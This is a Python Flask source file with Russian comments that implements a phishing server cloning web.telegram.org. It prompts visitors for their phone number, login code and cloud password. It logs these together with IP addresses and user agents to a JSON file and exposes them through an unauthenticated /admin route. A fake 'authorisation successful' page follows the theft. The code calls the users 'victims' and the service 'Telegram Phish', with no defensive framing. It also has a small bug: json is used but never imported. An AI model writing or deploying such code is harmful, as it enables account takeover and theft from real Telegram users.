import os
import random
import time
from datetime import datetime
from flask import Flask, request, jsonify, render_template
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'super-secret-key')

# 🎯 База данных "жертв"
captured_data = []

class TelegramPhisher:
    def __init__(self):
        self.webhook_url = os.getenv('WEBHOOK_URL', '')
    
    def save_credentials(self, phone, code, password=None):
        """Сохраняем перехваченные данные"""
        victim_data = {
            'phone': phone,
            'code': code,
            'password': password,
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent'),
            'timestamp': datetime.now().isoformat()
        }
        
        captured_data.append(victim_data)
        print(f"🎣 Перехвачены данные: {phone} | Код: {code}")
        
        # Сохраняем в файл (на всякий случай)
        with open('captured_data.json', 'w', encoding='utf-8') as f:
            json.dump(captured_data, f, ensure_ascii=False, indent=2)
        
        return victim_data

# Инициализация фишера
phisher = TelegramPhisher()

# 🎯 Маршруты
@app.route('/')
def index():
    """Главная страница - клон web.telegram.org"""
    return render_template('index.html')

@app.route('/auth/start', methods=['POST'])
def auth_start():
    """Принимаем номер телефона"""
    try:
        data = request.get_json()
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'success': False, 'error': 'Введите номер телефона'})
        
        # Имитируем отправку кода
        fake_code = str(random.randint(10000, 99999))
        
        return jsonify({
            'success': True,
            'message': f'Код отправлен на {phone}',
            'next_step': 'code',
            'debug_code': fake_code  # Для тестирования
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/auth/code', methods=['POST'])
def auth_code():
    """Принимаем код подтверждения"""
    try:
        data = request.get_json()
        code = data.get('code', '').strip()
        phone = data.get('phone', '')
        
        if not code:
            return jsonify({'success': False, 'error': 'Введите код'})
        
        # Сохраняем код
        victim_data = phisher.save_credentials(phone, code)
        
        # Проверяем, нужен ли пароль (рандомно)
        needs_password = random.choice([True, False])
        
        if needs_password:
            return jsonify({
                'success': True,
                'message': 'Введите пароль от облачного хранилища',
                'next_step': 'password'
            })
        else:
            return jsonify({
                'success': True,
                'message': '✅ Авторизация успешна!',
                'next_step': 'complete',
                'redirect': '/success'
            })
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/auth/password', methods=['POST'])
def auth_password():
    """Принимаем пароль"""
    try:
        data = request.get_json()
        password = data.get('password', '')
        phone = data.get('phone', '')
        code = data.get('code', '')
        
        if not password:
            return jsonify({'success': False, 'error': 'Введите пароль'})
        
        # Сохраняем все данные
        victim_data = phisher.save_credentials(phone, code, password)
        
        return jsonify({
            'success': True,
            'message': '✅ Авторизация успешна!',
            'next_step': 'complete',
            'redirect': '/success'
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/success')
def success():
    """Страница "успешной" авторизации"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Telegram</title>
        <style>
            body { 
                font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
                background: #18222d; 
                color: white; 
                margin: 0; 
                padding: 20px;
                display: flex;
                align-items: center;
                justify-content: center;
                min-height: 100vh;
            }
            .container { 
                max-width: 400px; 
                text-align: center; 
            }
            .logo { 
                font-size: 48px; 
                margin-bottom: 20px; 
            }
            .btn { 
                background: #0088cc; 
                color: white; 
                padding: 15px 30px; 
                border: none; 
                border-radius: 10px; 
                font-size: 16px; 
                cursor: pointer;
                margin-top: 20px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">✈️</div>
            <h1>Добро пожаловать в Telegram!</h1>
            <p>Ваш аккаунт успешно подключен.</p>
            <button class="btn" onclick="window.close()">Закрыть</button>
        </div>
    </body>
    </html>
    '''

@app.route('/admin')
def admin():
    """Админка для просмотра перехваченных данных"""
    return jsonify({
        'total_captured': len(captured_data),
        'data': captured_data
    })

@app.route('/health')
def health():
    """Проверка здоровья сервера"""
    return jsonify({
        'status': 'OK',
        'service': 'Telegram Phish',
        'timestamp': datetime.now().isoformat(),
        'captured_count': len(captured_data)
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
